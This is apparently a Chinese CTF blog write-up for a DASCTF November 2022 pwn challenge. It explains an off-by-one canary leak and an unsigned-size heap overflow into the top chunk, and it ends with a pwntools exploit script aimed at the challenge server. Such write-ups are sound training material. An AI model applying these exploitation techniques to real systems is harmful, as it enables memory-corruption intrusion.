---
title: DASCTF NOV X联合出题人2022年度积分榜争夺赛 pwn部分wp
tags:
  - 整形溢出
categories: 赛题WP
abbrlink: ffd20e6e
---
## 签个到

### 保护策略

![image-20221201104720121](https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202212011047418.png)

没开NX，但是对于本题来说没啥用，因为程序给了后门函数



### 程序逻辑

![image-20221201104846427](https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202212011048486.png)

![image-20221201105203859](https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202212011052461.png)

最初这里有个输入的地方存在off by one漏洞，结合到下面的%s输出考虑到可能是泄露数据，发现写入的地方紧挨canary，因此这里将canary泄露出来。



而后程序给了两个功能，一个是申请出来一个0x20的堆块，在向堆块里输入数据的时候存在一个漏洞。

![image-20221201105840410](https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202212011058480.png)

上面的这个a2可控，将其置成0。这样判断就是v5<=-1，而v5是无符号整形因此在判断的时候-1也会转成无符号整形，也就是0xffffffff，从而导致了堆溢出。



![image-20221201110128458](https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202212011101525.png)

另一个函数是进行了三个判断，如果全部通过的话则触发后门函数。

正常来说的话是无论如何也不会通过检查的，因为在第三个检查的地方是在拿堆块里的数据与canary做比较，但是正常来说申请完堆块第一个内存单元是0x00000886,这样跟canary比较是不可能通过的。

### 利用思路

但是赋值为0x886的时候发现有个判断，如下

![image-20221201110531488](https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202212011105526.png)

也就是说如果申请的堆块本身在v2的位置就有数据，那么就不会对v2再进行赋值了，联想到上面提到的堆溢出，利用思路就是直接溢出top chunk,不改变其size，但是在其用户区提前布置好canary，这样下次申请的新堆块在v2的位置本身就有数据了，从而通过最后的检查。



### EXP

```py
from tools import *
context.log_level='debug'
p,e,libc=load("pwn_5","node4.buuoj.cn:25028")

p.sendafter("who are u?\n","a"*0x9)
p.recvuntil("a"*9)
canary=u64(p.recv(7).rjust(8,b'\x00'))
log_addr('canary')

def add(size,content):
    p.sendlineafter("> ",str(1))
    p.sendlineafter("power length: ",str(size))
    p.sendlineafter("name: ",content)

def cmp(content):
    p.sendlineafter("> ",str(2))
    p.sendlineafter("data: ",content)


payload=b'd'*0xc+p64(0)+p64(0x20d51)+p64(canary)
add(0,payload)
add(0,p64(canary)[4:])
debug(p,'pie',0x17E3,0x181E,0x182A,0x168F)  
cmp(p64(canary)[4:])
p.interactive()
```

![image-20221201111058054](https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202212011110205.png)

